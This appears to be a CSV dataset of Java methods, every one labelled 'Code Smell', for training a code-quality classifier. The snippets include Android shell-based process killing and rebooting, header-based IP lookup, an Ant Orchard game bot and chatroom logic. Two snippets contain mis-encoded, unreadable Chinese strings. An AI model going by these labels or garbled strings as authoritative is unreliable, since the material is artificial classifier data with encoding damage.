text,label,text_label
"public void doRestart(String[] packageName,boolean isRestartSystem){
  boolean result=false;
  boolean pid=true;
  if (isRestartSystem) {
    result=ShellInit.getShell().run(""reboot"").sync().isResult();
  }
 else {
    if (packageName != null) {
      for (      String packageGet : packageName) {
        if (packageGet == null) {
          continue;
        }
        boolean getResult=ShellInit.getShell().add(""pid=$(pgrep -f \"""" + packageGet + ""\"" | grep -v $$)"").add(""if [[ $pid == \""\"" ]]; then"").add("" pids=\""\"""").add("" pid=$(ps -A -o PID,ARGS=CMD | grep \"""" + packageGet + ""\"" | grep -v \""grep\"")"").add(""  for i in $pid; do"").add(""   if [[ $(echo $i | grep '[0-9]' 2>/dev/null) != \""\"" ]]; then"").add(""    if [[ $pids == \""\"" ]]; then"").add(""      pids=$i"").add(""    else"").add(""      pids=\""$pids $i\"""").add(""    fi"").add(""   fi"").add(""  done"").add(""fi"").add(""if [[ $pids != \""\"" ]]; then"").add("" pid=$pids"").add(""fi"").add(""if [[ $pid != \""\"" ]]; then"").add("" for i in $pid; do"").add(""  kill -s 15 $i &>/dev/null"").add("" done"").add(""else"").add("" echo \""No Find Pid!\"""").add(""fi"").over().sync().isResult();
        ArrayList<String> outPut=ShellInit.getShell().getOutPut();
        ArrayList<String> error=ShellInit.getShell().getError();
        if (getResult) {
          if (!outPut.isEmpty()) {
            if (outPut.get(0).equals(""No Find Pid!"")) {
              pid=false;
            }
 else {
              result=true;
            }
          }
 else           result=true;
        }
 else         AndroidLogUtils.logE(""doRestart: "",""result: "" + ShellInit.getShell().getResult() + "" errorMsg: ""+ error+ "" package: ""+ packageGet);
      }
    }
 else {
      AndroidLogUtils.logE(""doRestart: "",""packageName is null"");
    }
  }
  if (!result) {
    new AlertDialog.Builder(this).setCancelable(false).setTitle(R.string.tip).setMessage(isRestartSystem ? R.string.reboot_failed : pid ? R.string.kill_failed : R.string.pid_failed).setHapticFeedbackEnabled(true).setPositiveButton(android.R.string.ok,null).show();
  }
}",1,Code Smell
"public static FileType getFileType(File file){
  try {
    String type=Files.probeContentType(file.toPath());
    if (type == null) {
      if (file.getName().toLowerCase(Locale.ROOT).endsWith(""txn"") || file.getName().toLowerCase(Locale.ROOT).endsWith(""psbt"")) {
        return FileType.TEXT;
      }
      if (file.exists()) {
        try (BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(file),StandardCharsets.UTF_8))){
          String line=br.readLine();
          if (line != null) {
            if (line.startsWith(""01000000"") || line.startsWith(""cHNid"")) {
              return FileType.TEXT;
            }
 else             if (line.startsWith(""{"")) {
              return FileType.JSON;
            }
          }
        }
       }
      return FileType.BINARY;
    }
 else     if (type.equals(""application/json"")) {
      return FileType.JSON;
    }
 else     if (type.startsWith(""text"")) {
      return FileType.TEXT;
    }
  }
 catch (  IOException e) {
  }
  return FileType.UNKNOWN;
}",1,Code Smell
"/** 
 * 加载Meta树
 * @return
 */
private MetaTree loadMetaTree(NodeContext context){
  MetaTree rootNode=getRootInWindows(context);
  int retryCount=0;
  while ((rootNode == null || rootNode.getCurrentNode() == null) && retryCount < 3) {
    MiscUtil.sleep(500);
    retryCount++;
    rootNode=getRootInWindows(context);
  }
  if (rootNode == null || rootNode.getCurrentNode() == null) {
    LogUtil.e(TAG,""根节点为空"");
    restartAccessibilityService();
    return null;
  }
  Queue<Pair<MetaTree,AccessibilityNodeInfo>> nodeQueue=new LinkedList<>();
  if (rootNode.getCurrentNode() instanceof FakeNodeTree) {
    for (    MetaTree child : rootNode.getChildren()) {
      if (child.getCurrentNode() instanceof AccessibilityNodeInfo) {
        nodeQueue.add(new Pair<>(child,(AccessibilityNodeInfo)child.getCurrentNode()));
      }
    }
  }
 else {
    nodeQueue.add(new Pair<>(rootNode,(AccessibilityNodeInfo)rootNode.getCurrentNode()));
  }
  Pair<MetaTree,AccessibilityNodeInfo> curr=null;
  while ((curr=nodeQueue.poll()) != null) {
    MetaTree tmpTree=curr.first;
    AccessibilityNodeInfo info=curr.second;
    if (!reloadFlag && (StringUtil.equals(info.getClassName(),""android.webkit.WebView"") || StringUtil.contains(info.getClassName(),""com.uc.webkit""))) {
      reloadFlag=true;
      LogUtil.d(TAG,""发现WebView，重载下界面"");
      info.performAction(AccessibilityNodeInfo.ACTION_ACCESSIBILITY_FOCUS);
      MiscUtil.sleep(100);
      recycleTmpTree(rootNode);
      return null;
    }
    tmpTree.setCurrentNode(info);
    int childCount=info.getChildCount();
    if (childCount > 0) {
      List<MetaTree> children=new ArrayList<>(childCount + 1);
      for (int i=0; i < childCount; i++) {
        AccessibilityNodeInfo child=info.getChild(i);
        if (child != null) {
          MetaTree newTree=new MetaTree();
          children.add(newTree);
          nodeQueue.add(new Pair<>(newTree,info.getChild(i)));
        }
      }
      tmpTree.setChildren(children);
    }
  }
  return rootNode;
}",1,Code Smell
"@Override public int compare(Content c1,Content c2){
  if (!(c1 instanceof Xml.Tag) || !(c2 instanceof Xml.Tag)) {
    return 1;
  }
  Xml.Tag t1=(Xml.Tag)c1;
  Xml.Tag t2=(Xml.Tag)c2;
  int i1=existingIndices.getOrDefault(t1,-1);
  int i2=existingIndices.getOrDefault(t2,-1);
  if (i1 == -1) {
    if (i2 == -1) {
      return canonicalOrdering.indexOf(t1.getName()) - canonicalOrdering.indexOf(t2.getName());
    }
 else {
      for (int i=0; i < canonicalOrdering.indexOf(t2.getName()); i++) {
        if (canonicalOrdering.get(i).equals(t1.getName())) {
          return -1;
        }
      }
      return 1;
    }
  }
 else {
    if (i2 == -1) {
      for (int i=0; i < canonicalOrdering.indexOf(t1.getName()); i++) {
        if (canonicalOrdering.get(i).equals(t2.getName())) {
          return 1;
        }
      }
      return -1;
    }
 else {
      return i1 - i2;
    }
  }
}",1,Code Smell
"public static Map<String,String> resolve(HttpServletRequest request,Set<String> labelKeys){
  if (CollectionUtils.isEmpty(labelKeys)) {
    return Collections.emptyMap();
  }
  Map<String,String> labels=new HashMap<>();
  for (  String labelKey : labelKeys) {
    if (!ExpressionLabelUtils.isExpressionLabel(labelKey)) {
      continue;
    }
    if (ExpressionLabelUtils.isHeaderLabel(labelKey)) {
      String headerKey=ExpressionLabelUtils.parseHeaderKey(labelKey);
      if (StringUtils.isBlank(headerKey)) {
        continue;
      }
      labels.put(labelKey,request.getHeader(headerKey));
    }
 else     if (ExpressionLabelUtils.isQueryLabel(labelKey)) {
      String queryKey=ExpressionLabelUtils.parseQueryKey(labelKey);
      if (StringUtils.isBlank(queryKey)) {
        continue;
      }
      labels.put(labelKey,ExpressionLabelUtils.getQueryValue(request.getQueryString(),queryKey));
    }
 else     if (ExpressionLabelUtils.isCookieLabel(labelKey)) {
      String cookieKey=ExpressionLabelUtils.parseCookieKey(labelKey);
      if (StringUtils.isBlank(cookieKey)) {
        continue;
      }
      labels.put(labelKey,getCookieValue(request.getCookies(),cookieKey));
    }
 else     if (ExpressionLabelUtils.isMethodLabel(labelKey)) {
      labels.put(labelKey,request.getMethod());
    }
 else     if (ExpressionLabelUtils.isUriLabel(labelKey)) {
      labels.put(labelKey,request.getRequestURI());
    }
  }
  return labels;
}
",1,Code Smell
"private static void querySubplotsActivity(int taskRequire){
  try {
    String s=AntOrchardRpcCall.querySubplotsActivity(treeLevel);
    JSONObject jo=new JSONObject(s);
    if (""100"".equals(jo.getString(""resultCode""))) {
      JSONArray subplotsActivityList=jo.getJSONArray(""subplotsActivityList"");
      for (int i=0; i < subplotsActivityList.length(); i++) {
        jo=subplotsActivityList.getJSONObject(i);
        if (!""WISH"".equals(jo.getString(""activityType"")))         continue;
        String activityId=jo.getString(""activityId"");
        if (""NOT_STARTED"".equals(jo.getString(""status""))) {
          String extend=jo.getString(""extend"");
          jo=new JSONObject(extend);
          JSONArray wishActivityOptionList=jo.getJSONArray(""wishActivityOptionList"");
          String optionKey=null;
          for (int j=0; j < wishActivityOptionList.length(); j++) {
            jo=wishActivityOptionList.getJSONObject(j);
            if (taskRequire == jo.getInt(""taskRequire"")) {
              optionKey=jo.getString(""optionKey"");
              break;
            }
          }
          if (optionKey != null) {
            jo=new JSONObject(AntOrchardRpcCall.triggerSubplotsActivity(activityId,""WISH"",optionKey));
            if (""100"".equals(jo.getString(""resultCode""))) {
              Log.farm(""鍐滃満璁告効鉁╗姣忔棩鏂借偉"" + taskRequire + ""娆"");
            }
 else {
              Log.recordLog(jo.getString(""resultDesc""),jo.toString());
            }
          }
        }
 else         if (""FINISHED"".equals(jo.getString(""status""))) {
          jo=new JSONObject(AntOrchardRpcCall.receiveOrchardRights(activityId,""WISH""));
          if (""100"".equals(jo.getString(""resultCode""))) {
            Log.farm(""璁告効濂栧姳鉁╗鑲ユ枡"" + jo.getInt(""amount"") + ""g]"");
            querySubplotsActivity(taskRequire);
            return;
          }
 else {
            Log.recordLog(jo.getString(""resultDesc""),jo.toString());
          }
        }
      }
    }
 else {
      Log.recordLog(jo.getString(""resultDesc""),s);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""triggerTbTask err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"/** 
 * 获取客户端IP地址
 */
public static String getRemoteAddr(ServerHttpRequest request){
  Map<String,String> headers=request.getHeaders().toSingleValueMap();
  String ip=headers.get(""X-Forwarded-For"");
  if (isEmptyIP(ip)) {
    ip=headers.get(""Proxy-Client-IP"");
    if (isEmptyIP(ip)) {
      ip=headers.get(""WL-Proxy-Client-IP"");
      if (isEmptyIP(ip)) {
        ip=headers.get(""HTTP_CLIENT_IP"");
        if (isEmptyIP(ip)) {
          ip=headers.get(""HTTP_X_FORWARDED_FOR"");
          if (isEmptyIP(ip)) {
            ip=request.getRemoteAddress().getAddress().getHostAddress();
            if (""127.0.0.1"".equals(ip) || ""0:0:0:0:0:0:0:1"".equals(ip)) {
              ip=getLocalAddr();
            }
          }
        }
      }
    }
  }
 else   if (ip.length() > 15) {
    String[] ips=ip.split("","");
    for (int index=0; index < ips.length; index++) {
      String strIp=ips[index];
      if (!isEmptyIP(ip)) {
        ip=strIp;
        break;
      }
    }
  }
  return ip;
}",1,Code Smell
"/** 
 * 瑙ｆ瀽 {@linkplain DataSetProperty}銆�
 * @param propertyNames
 * @param data              鍏佽涓簕@code null}
 * @return
 * @throws Throwable
 */
protected List<DataSetProperty> resolveProperties(List<String> propertyNames,List<Map<String,String>> data) throws Throwable {
  int propertyLen=propertyNames.size();
  List<DataSetProperty> properties=new ArrayList<>(propertyLen);
  for (  String name : propertyNames)   properties.add(new DataSetProperty(name,DataSetProperty.DataType.STRING));
  if (data != null && data.size() > 0) {
    Boolean[] isNumbers=new Boolean[propertyLen];
    for (    Map<String,String> row : data) {
      for (int i=0; i < propertyLen; i++) {
        if (Boolean.FALSE.equals(isNumbers[i]))         continue;
        String value=row.get(propertyNames.get(i));
        if (StringUtil.isEmpty(value))         continue;
        isNumbers[i]=isNumberString(value);
      }
    }
    for (int i=0; i < propertyLen; i++) {
      if (Boolean.TRUE.equals(isNumbers[i]))       properties.get(i).setType(DataSetProperty.DataType.NUMBER);
    }
  }
  return properties;
}",1,Code Smell
"@Override public boolean apply(String value){
  if (value == null) {
    return true;
  }
  if (value.length() == 1) {
    var c=value.charAt(0);
    if (Character.isDigit(c)) {
      selected=Integer.parseInt(value) - 1;
      return true;
    }
    for (int i=0; i < elements.size(); i++) {
      if (elements.get(i).getCharacter() != null && elements.get(i).getCharacter().equals(c)) {
        selected=i;
        return true;
      }
    }
  }
 else {
    for (int i=0; i < elements.size(); i++) {
      if (elements.get(i).getDescription().equalsIgnoreCase(value)) {
        selected=i;
        return true;
      }
    }
  }
  return false;
}",1,Code Smell
"@Override public ErrorCode handleJoinChatroom(String userId,String clientId,String chatroomId){
  IMap<String,WFCMessage.ChatroomInfo> chatroomInfoMap=m_Server.getHazelcastInstance().getMap(CHATROOMS);
  if (chatroomInfoMap == null || chatroomInfoMap.get(chatroomId) == null || chatroomInfoMap.get(chatroomId).getState() == ProtoConstants.ChatroomState.Chatroom_State_End) {
    if (mChatroomCreateWhenNotExist) {
      WFCMessage.ChatroomInfo.Builder builder=WFCMessage.ChatroomInfo.newBuilder().setTitle(chatroomId);
      createChatroom(chatroomId,builder.build());
    }
 else {
      return ErrorCode.ERROR_CODE_NOT_EXIST;
    }
  }
  MultiMap<String,UserClientEntry> chatroomMembers=m_Server.getHazelcastInstance().getMultiMap(CHATROOM_MEMBER_IDS);
  String alreadyInChatroom=(String)m_Server.getHazelcastInstance().getMap(USER_CHATROOM).get(userId);
  if (alreadyInChatroom != null) {
    for (    UserClientEntry userClientEntry : chatroomMembers.get(alreadyInChatroom)) {
      if (userClientEntry.userId.equals(userId)) {
        if (!chatroomId.equals(alreadyInChatroom) || !userClientEntry.clientId.equals(clientId)) {
          if (mChatroomKickoffOtherPlatform) {
            handleQuitChatroom(userId,userClientEntry.clientId,chatroomId);
          }
 else {
            return ErrorCode.ERROR_CODE_OTHER_CLIENT_ALREADY_IN_CHATROOM;
          }
        }
      }
    }
  }
  m_Server.getStore().sessionsStore().getSession(clientId).refreshLastChatroomActiveTime();
  m_Server.getHazelcastInstance().getMap(USER_CHATROOM).put(userId,chatroomId);
  chatroomMembers.put(chatroomId,new UserClientEntry(userId,clientId));
  mWriteLock.lock();
  chatroomMessages.put(userId,new TreeMap<>());
  mWriteLock.unlock();
  callbackChatroomMemberEvent(userId,chatroomId,Arrays.asList(userId),Chatroom_Member_Event_Join);
  return ErrorCode.ERROR_CODE_SUCCESS;
}
",1,Code Smell
